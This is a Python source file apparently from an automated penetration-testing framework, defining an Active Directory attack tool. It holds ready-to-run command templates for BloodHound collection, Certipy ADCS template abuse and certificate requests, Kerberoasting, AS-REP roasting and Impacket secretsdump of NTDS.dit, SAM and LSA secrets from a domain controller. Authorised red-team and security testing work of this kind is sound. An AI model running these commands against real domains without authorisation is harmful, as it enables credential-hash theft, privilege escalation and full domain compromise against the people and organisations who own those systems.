"""Active Directory security testing — BloodHound, Certipy, enum4linux-ng, Impacket."""
from __future__ import annotations

import logging
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)


class ADAttackTool(BasePentestTool):
    """Active Directory attack and enumeration toolkit.

    Wraps BloodHound-python for AD graph collection, Certipy for ADCS
    certificate abuse, enum4linux-ng for SMB/LDAP/RPC enumeration, native
    ldapsearch for LDAP queries, and Impacket for Kerberoasting, AS-REP
    roasting, and secrets dumping.
    """

    name = "ad_attack"
    description = (
        "Active Directory security testing — BloodHound graph collection, "
        "Certipy ADCS certificate abuse (ESC1-ESC8), enum4linux-ng SMB/LDAP "
        "enumeration, LDAP search, Impacket Kerberoast/AS-REP roast/secretsdump."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "bloodhound_collect": {
            "cmd": [
                "bloodhound-python", "-d", "{domain}", "-u", "{username}",
                "-p", "{password}", "-ns", "{target}", "-c", "All", "--zip",
            ],
            "timeout": 300,
            "description": "Collect AD data for BloodHound analysis",
        },
        "bloodhound_edges": {
            "cmd": [
                "bloodhound-python", "-d", "{domain}", "-u", "{username}",
                "-p", "{password}", "-ns", "{target}", "-c", "ACL,Trusts", "--zip",
            ],
            "timeout": 180,
            "description": "Collect ACL and trust relationships",
        },
        "certipy_find": {
            "cmd": [
                "certipy", "find", "-u", "{username}@{domain}",
                "-p", "{password}", "-dc-ip", "{target}", "-json",
            ],
            "timeout": 120,
            "description": "Enumerate AD Certificate Services (ADCS) templates",
        },
        "certipy_vuln": {
            "cmd": [
                "certipy", "find", "-u", "{username}@{domain}",
                "-p", "{password}", "-dc-ip", "{target}", "-vulnerable", "-json",
            ],
            "timeout": 120,
            "description": "Find vulnerable ADCS certificate templates (ESC1-ESC8)",
        },
        "certipy_req": {
            "cmd": [
                "certipy", "req", "-u", "{username}@{domain}",
                "-p", "{password}", "-ca", "{ca_name}",
                "-template", "{template}", "-dc-ip", "{target}",
            ],
            "timeout": 60,
            "description": "Request a certificate from a vulnerable template",
        },
        "enum4linux_ng": {
            "cmd": ["enum4linux-ng", "-A", "{target}", "-oJ", "/dev/stdout"],
            "timeout": 120,
            "description": "Enumerate SMB/LDAP/RPC information",
        },
        "ldapsearch": {
            "cmd": [
                "ldapsearch", "-x", "-H", "ldap://{target}",
                "-b", "{base_dn}", "-D", "{username}@{domain}",
                "-w", "{password}", "{filter}",
            ],
            "timeout": 60,
            "description": "LDAP search query",
        },
        "kerberoast": {
            "cmd": [
                "impacket-GetUserSPNs", "{domain}/{username}:{password}",
                "-dc-ip", "{target}", "-request", "-outputfile", "/dev/stdout",
            ],
            "timeout": 60,
            "description": "Extract Kerberoastable service account hashes",
        },
        "asreproast": {
            "cmd": [
                "impacket-GetNPUsers", "{domain}/", "-usersfile", "{wordlist}",
                "-dc-ip", "{target}", "-format", "hashcat",
            ],
            "timeout": 60,
            "description": "Extract AS-REP roastable user hashes",
        },
        "secretsdump": {
            "cmd": [
                "impacket-secretsdump",
                "{domain}/{username}:{password}@{target}",
            ],
            "timeout": 120,
            "description": "Dump secrets (NTDS.dit, SAM, LSA) from domain controller",
        },
    }

    async def execute(
        self,
        action: str,
        target: str = "",
        domain: str = "",
        username: str = "",
        password: str = "",
        base_dn: str = "",
        filter: str = "(objectClass=*)",
        ca_name: str = "",
        template: str = "",
        wordlist: str = "",
        timeout: int = 120,
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        spec = self.ACTIONS[action]
        cmd = [
            c.format(
                target=target,
                domain=domain,
                username=username,
                password=password,
                base_dn=base_dn,
                filter=filter,
                ca_name=ca_name,
                template=template,
                wordlist=wordlist,
                timeout=timeout,
            )
            for c in spec["cmd"]
        ]
        effective_timeout = spec.get("timeout", timeout)

        return await self._run(
            action=action,
            cmd=cmd,
            timeout=effective_timeout,
            target_hint=target,
        )
